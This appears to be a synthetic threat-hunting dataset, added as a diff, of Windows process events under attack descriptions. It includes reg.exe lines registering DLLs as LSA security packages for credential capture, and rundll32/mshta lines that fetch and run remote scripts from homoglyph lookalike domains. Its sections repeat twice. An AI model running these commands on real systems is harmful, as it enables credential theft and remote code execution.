@@ -1,0 +1,774 @@
+Attack Description: The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. Adversaries could also inject malicious DLLs into registry keys that are loaded after reboot. When a user authenticates the DLLs have a routine that captures their credentials after login.
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\8b418uk61.dll
+                        Hostname: 0003FSINS
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 1852
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\wdfmg.dll
+                        Hostname: 0002OIUNW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 976
+                        Username: daisynelso69
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\netlgn.dll
+                        Hostname: 0005FSISC
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 728
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\lsfk21d.dll
+                        Hostname: 0003FSISW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 3372
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\lsacc.dll
+                        Hostname: 0004FXGWS
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 5980
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\owsx7.dll
+                        Hostname: 0002RVTSN
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 4484
+                        Username: evelperez61
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\setupapi.dll
+                        Hostname: 0000DPUEW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 2424
+                        Username: isabellesimmo
+                        
+Attack Description: Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Ш3.com/netlgn.js'").Exec();"
+                        Hostname: 0003FXGWL
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 592
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Шikipedia.com.au/netlgn.js'").Exec();"
+                        Hostname: 0000TEBSE
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 1088
+                        Username: ryamorr
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Уoutube.org/19w1.js'").Exec();"
+                        Hostname: 0004IXGWB
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 2664
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Шikipedia.com/drprov.js'").Exec();"
+                        Hostname: 0007PKYEB
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 588
+                        Username: zarbake19
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0005JOFSS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1296
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0005JOFSS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1296
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0004FXGWS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1380
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0004FXGWS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1380
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Рintrest.net/kmbmmgo51n.js'").Exec();"
+                        Hostname: 0006PKYSW
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 2732
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0002RVTSN
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 5652
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0002RVTSN
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 5652
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.drop-box.com.au/o8ffyz.js'").Exec();"
+                        Hostname: 0002RVTSN
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 4124
+                        Username: svc_hc
+                        
+Attack Description: PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0002OIUSC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4922
+                        Username: annagra
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0000TEBSE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3516
+                        Username: ellie.diaz52
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0004IXGWB
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 805
+                        Username: iri.jone4
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004IXGWB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 4420
+                        Username: nicbell76
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0005LKOES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 562
+                        Username: jayden.foste
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0005LKOES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 3194
+                        Username: jayden.foste
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0005FXGSS
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 3833
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0002PKYWB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 5901
+                        Username: xav.par72
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0007PKYEB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 4232
+                        Username: zarbake19
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0009FSIWE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 5996
+                        Username: svc_hc
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0001FSIEW
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2640
+                        Username: annagra
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0006IAAES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 6033
+                        Username: iankel
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0001FXGSE
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4489
+                        Username: lotti.richards
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007DPUWW
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 1241
+                        Username: alejanallen17
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004YICSL
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3696
+                        Username: iankel
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004YICSL
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3880
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0000TEBSC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3728
+                        Username: zarwatso67
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0002NDIES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2162
+                        Username: ivy.hil
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0008LKOWC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 6107
+                        Username: johpeters96
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0008LKOWC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 5472
+                        Username: johpeters96
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0004FXGWS
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 4041
+                        Username: kyl.sanders
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0004OZJEE
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 5354
+                        Username: svc_ms
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004OZJEE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 1580
+                        Username: emma.ward12
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007TFKSL
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 1914
+                        Username: zarwatso67
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0006PKYSW
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 1516
+                        Username: darc.flore1
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0000ZIFSB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 1351
+                        Username: jesale23
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007FOAEB
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4894
+                        Username: nicbell76
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0001TFKWC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 3504
+                        Username: freyree
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0001TFKWC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2039
+                        Username: lea.russel33
+                        
+Attack Description: Registry: The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. Adversaries could also inject malicious DLLs into registry keys that are loaded after reboot. When a user authenticates the DLLs have a routine that captures their credentials after login.
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\8b418uk61.dll
+                        Hostname: 0003FSINS
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 1852
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\wdfmg.dll
+                        Hostname: 0002OIUNW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 976
+                        Username: daisynelso69
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\netlgn.dll
+                        Hostname: 0005FSISC
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 728
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\lsfk21d.dll
+                        Hostname: 0003FSISW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 3372
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\lsacc.dll
+                        Hostname: 0004FXGWS
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 5980
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\owsx7.dll
+                        Hostname: 0002RVTSN
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 4484
+                        Username: evelperez61
+                        
+
+                        Arguments: C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\setupapi.dll
+                        Hostname: 0000DPUEW
+                        Name: reg.exe
+                        Path: C:\Windows\System32\reg.exe
+                        Pid: 2424
+                        Username: isabellesimmo
+                        
+Attack Description: Scripts: Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Ш3.com/netlgn.js'").Exec();"
+                        Hostname: 0003FXGWL
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 592
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Шikipedia.com.au/netlgn.js'").Exec();"
+                        Hostname: 0000TEBSE
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 1088
+                        Username: ryamorr
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Уoutube.org/19w1.js'").Exec();"
+                        Hostname: 0004IXGWB
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 2664
+                        Username: jasmin.washin
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Шikipedia.com/drprov.js'").Exec();"
+                        Hostname: 0007PKYEB
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 588
+                        Username: zarbake19
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0005JOFSS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1296
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0005JOFSS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1296
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0004FXGWS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1380
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0004FXGWS
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 1380
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.Рintrest.net/kmbmmgo51n.js'").Exec();"
+                        Hostname: 0006PKYSW
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 2732
+                        Username: darc.flore1
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0002RVTSN
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 5652
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();
+                        Hostname: 0002RVTSN
+                        Name: mshta.exe
+                        Path: C:\Windows\System32\mshta.exe
+                        Pid: 5652
+                        Username: NT AUTHORITY\SYSTEM
+                        
+
+                        Arguments: C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:\http://www.drop-box.com.au/o8ffyz.js'").Exec();"
+                        Hostname: 0002RVTSN
+                        Name: rundll32.exe
+                        Path: C:\Windows\System32\rundll32.exe
+                        Pid: 4124
+                        Username: svc_hc
+                        
+Attack Description: Powershell: PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0002OIUSC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4922
+                        Username: annagra
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0000TEBSE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3516
+                        Username: ellie.diaz52
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0004IXGWB
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 805
+                        Username: iri.jone4
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004IXGWB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 4420
+                        Username: nicbell76
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0005LKOES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 562
+                        Username: jayden.foste
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0005LKOES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 3194
+                        Username: jayden.foste
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0005FXGSS
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 3833
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0002PKYWB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 5901
+                        Username: xav.par72
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0007PKYEB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 4232
+                        Username: zarbake19
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0009FSIWE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 5996
+                        Username: svc_hc
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0001FSIEW
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2640
+                        Username: annagra
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0006IAAES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 6033
+                        Username: iankel
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0001FXGSE
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4489
+                        Username: lotti.richards
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007DPUWW
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 1241
+                        Username: alejanallen17
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004YICSL
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3696
+                        Username: iankel
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004YICSL
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3880
+                        Username: ambe.alexand52
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0000TEBSC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 3728
+                        Username: zarwatso67
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0002NDIES
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2162
+                        Username: ivy.hil
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0008LKOWC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 6107
+                        Username: johpeters96
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0008LKOWC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 5472
+                        Username: johpeters96
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0004FXGWS
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 4041
+                        Username: kyl.sanders
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0004OZJEE
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 5354
+                        Username: svc_ms
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0004OZJEE
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 1580
+                        Username: emma.ward12
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007TFKSL
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 1914
+                        Username: zarwatso67
+                        
+
+                        Arguments: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date
+                        Hostname: 0006PKYSW
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\powershell.exe
+                        Pid: 1516
+                        Username: darc.flore1
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0000ZIFSB
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 1351
+                        Username: jesale23
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0007FOAEB
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 4894
+                        Username: nicbell76
+                        
+
+                        Arguments: "C:\Program Files\internet explorer\iexplore.exe" 
+                        Hostname: 0001TFKWC
+                        Name: iexplore.exe
+                        Path: C:\Program Files\internet explorer
+                        Pid: 3504
+                        Username: freyree
+                        
+
+                        Arguments: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+                        Hostname: 0001TFKWC
+                        Name: powershell.exe
+                        Path: C:\Windows\System32\WindowsPowerShell\v1.0
+                        Pid: 2039
+                        Username: lea.russel33
+                        
